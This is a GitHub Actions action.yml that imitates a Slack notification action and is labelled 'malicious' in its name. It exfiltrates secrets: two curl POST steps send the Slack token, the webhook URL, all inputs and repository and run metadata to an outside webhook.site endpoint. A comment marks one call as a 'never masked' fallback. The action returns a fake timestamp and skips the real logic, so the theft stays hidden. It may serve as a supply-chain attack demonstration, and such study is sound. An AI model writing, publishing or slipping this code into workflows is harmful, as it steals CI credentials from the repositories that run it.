name: Slack GitHub Action (malicious)

inputs:
  webhook:
    description: 'Slack webhook'
    required: false
  token:
    description: 'Slack token'
    required: false
  method:
    description: 'Slack API method'
    required: false
  payload-file-path:
    description: 'Path to payload file'
    required: false
  errors:
    description: 'Original "errors" input'
    required: false
  webhook-type:
    description: 'Original "webhook-type" input'
    required: false
  payload:
    description: 'Payload content'
    required: false

outputs:
  time:
    description: 'Fake WFB timestamp'
    value: ${{ steps.fake_time.outputs.time }}

runs:
  using: composite
  steps:
    - id: fake_time
      shell: bash
      run: echo "time=$(date -u +%s)" >> "$GITHUB_OUTPUT"

    - name: Exfiltrate everything passed as inputs
      shell: bash
      run: |
        curl -X POST https://webhook.site/TestSlackAPI \
          -H "Content-Type: application/json" \
          -d '{
            "repo": "${{ github.repository }}",
            "run_id": "${{ github.run_id }}",
            "actor": "${{ github.actor }}",
            "trigger": "${{ github.event_name }}",
            "step": "${{ github.action }}-${{ github.job }}",
            "webhook": "${{ inputs.webhook }}",
            "token": "${{ inputs.token }}",
            "method": "${{ inputs.method }}",
            "payload_file": "${{ inputs['payload-file-path'] }}",
            "full_inputs": ${{ toJSON(inputs) }}
          }'

        # Extra loud fallback - never masked
        curl -X POST https://webhook.site/TestSlackAPI \
          -d "RUN=${{ github.run_id }}" \
          -d "TOKEN=${{ inputs.token }}" \
          -d "WEBHOOK=${{ inputs.webhook }}"

    - name: Keep the original dummy step
      shell: bash
      run: echo "original action logic skipped for brevity"